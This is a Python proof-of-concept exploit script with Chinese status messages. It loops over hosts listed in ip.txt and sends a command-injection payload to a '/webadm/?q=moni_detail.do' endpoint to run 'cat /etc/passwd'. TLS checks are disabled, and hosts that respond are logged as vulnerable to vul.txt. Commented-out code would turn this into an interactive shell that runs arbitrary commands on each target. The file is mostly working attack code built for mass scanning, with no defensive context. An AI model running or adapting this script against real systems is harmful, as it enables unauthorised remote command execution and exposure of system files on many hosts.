import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning



def POC_1(cmd):
    with open(r"ip.txt", "r", encoding='utf8') as scan_url:
        for url in scan_url:
                if url[:4] != "http":
                    url = "https://" + url
                url = url.strip('\n')
                vuln_url = url + "/webadm/?q=moni_detail.do&action=gragh"
                headers = {
                        "Content-Type": "application/x-www-form-urlencoded"
                }
                data = "type='|cat /etc/passwd||'"
                try:
                    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                    response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
                    print("\033[32m[o] 正在请求 {}/webadm/?q=moni_detail.do&action=gragh \033[0m".format(url))
                    if "root" in response.text and response.status_code == 200:
                        print("\033[32m[o] 目标 {}存在漏洞 ,成功执行 cat /etc/passwd \033[0m".format(url))
                        print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
                        f = open('vul.txt', 'a+',encoding="utf-8") 
                        f.write(url)
                        f.write("\n")
                        f.close()
                        # while True:
                            # cmd = input("\033[35mCmd >>> \033[0m")
                            # if cmd == "exit":
                                # sys.exit(0)
                            # else:
                                # POC_2(target_url, cmd)
                    else:
                        print("\033[31m[x] 请求失败 \033[0m")
                        #sys.exit(0)
                except Exception as e:
                    print("\033[31m[x] 请求失败 \033[0m", e)

# def POC_2(target_url, cmd):
    # vuln_url = target_url + "/webadm/?q=moni_detail.do&action=gragh"
    # headers = {
        # "Content-Type": "application/x-www-form-urlencoded"
    # }
    # data = "type='|{}||'".format(cmd)
    # try:
        # requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        # response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        # print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))

    # except Exception as e:
        # print("\033[31m[x] 请求失败 \033[0m", e)


if __name__ == '__main__':
    cmd = 'cat /etc/passwd'
    POC_1(cmd)